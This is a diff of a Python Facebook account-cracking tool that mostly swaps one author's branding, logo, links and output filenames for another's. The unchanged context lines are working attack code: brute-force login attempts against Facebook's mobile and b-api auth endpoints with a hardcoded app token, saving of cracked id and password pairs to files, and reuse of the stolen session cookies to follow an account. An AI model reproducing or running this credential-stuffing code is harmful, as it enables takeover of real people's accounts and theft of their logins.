@@ -324,17 +324,17 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m[BRAND-CP] {idf} * {pw}')
+				print( f'\r\x1b[1;91m[MAJID-CP] {idf} * {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [BRAND-CP] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [MAJID-CP] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/BRAND-CP.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MAJID-CP.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -369,10 +369,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨','a').write('%s\n' % wrt)
+				open('/sdcard/𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -389,20 +389,23 @@ def follow(ses,coki):
  
 logo = """
 
-███████╗██╗  ██╗███████╗███████╗██████╗  ██████╗ 
-██╔════╝██║  ██║██╔════╝██╔════╝██╔══██╗██╔═══██╗
-███████╗███████║█████╗  █████╗  ██████╔╝██║   ██║
-╚════██║██╔══██║██╔══╝  ██╔══╝  ██╔══██╗██║   ██║
-███████║██║  ██║███████╗███████╗██║  ██║╚██████╔╝
-╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
+
+███    ███  █████       ██ ██ ██████  
+████  ████ ██   ██      ██ ██ ██   ██ 
+██ ████ ██ ███████      ██ ██ ██   ██ 
+██  ██  ██ ██   ██ ██   ██ ██ ██   ██ 
+██      ██ ██   ██  █████  ██ ██████  
+                                      
+                                      
+
                                                  
 \x1b[1;97m---------------------------------------------------
 \33[1;41m𝗧𝗢𝗢𝗟𝗦 𝗨𝗣𝗗𝗔𝗧𝗘 𝗙𝗜𝗥𝗦𝗧 𝗦𝗘𝗡𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 \33[0m
 \x1b[1;97m---------------------------------------------------
-\x1b[1;97m[+] 𝗔𝗨𝗧𝗛𝗢𝗥  :   𝚂𝙷𝙴𝙴𝚁𝙾      
-\x1b[1;97m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :  𝙼𝚞𝚑𝚊𝚖𝚖𝚊𝚍 𝚂𝚑𝚊𝚑𝚎𝚎𝚛 𝙺𝚑𝚊𝚗
-\x1b[1;97m[+] 𝗚𝗜𝗧𝗛𝗨𝗕  :   𝚜𝚑𝚎𝚎𝚛𝚘𝚇𝚐𝚞𝚛𝚒𝚊
-\x1b[1;97m[+] 𝗧𝗘𝗔𝗠    :   \33[1;42  𝚜𝚑𝚎𝚎𝚛𝚘𝚇𝚐𝚞𝚛𝚒𝚊\33[0m
+\x1b[1;97m[+] 𝗔𝗨𝗧𝗛𝗢𝗥  :   MAJID KHAN/YASHIKA Sarang   
+\x1b[1;97m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :  MAJID KHAN/Emaan fatima
+\x1b[1;97m[+] 𝗚𝗜𝗧𝗛𝗨𝗕  :    MAJID KHAN/haji Ahmed 
+\x1b[1;97m[+] 𝗧𝗘𝗔𝗠    :   \33[1;42 Trusted heart shooters  \33[0m
 \x1b[1;97m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 :\x1b[1;97m  1.0.2    \x1b[1;97m          
 \x1b[1;97m--------------------------------------
 """
@@ -430,9 +433,9 @@ class Main:
 			exit()
 		elif Baloch in ["2", "02"]:
 			print("    Thanks♥️")
-			exit()
+			exit() 
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://www.facebook.com/muhammad.shaheerkhan.12327 ")
+			os.system("xdg-open https://www.facebook.com/MajidHunYwr ")
 			print("")
 			time.sleep(3.0)
 			print("\033[1;37m    𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 ")
@@ -440,7 +443,7 @@ class Main:
 			input("\n\033[1;37m TYᑭᗴ Tᕼᗴ Oᗯᑎᗴᖇ ᖴᗩᑕᗴᗷOOK ᗩᑕᑕOᑌᑎT ᑎᗩᗰᗴ \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••𝗦𝗛𝗘𝗘𝗥𝗢•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
+			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••𝗠𝗔𝗝𝗜𝗗•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
@@ -885,15 +888,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨]%s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1316,13 +1319,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝐒𝐡𝐞𝐞𝐫𝐨] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
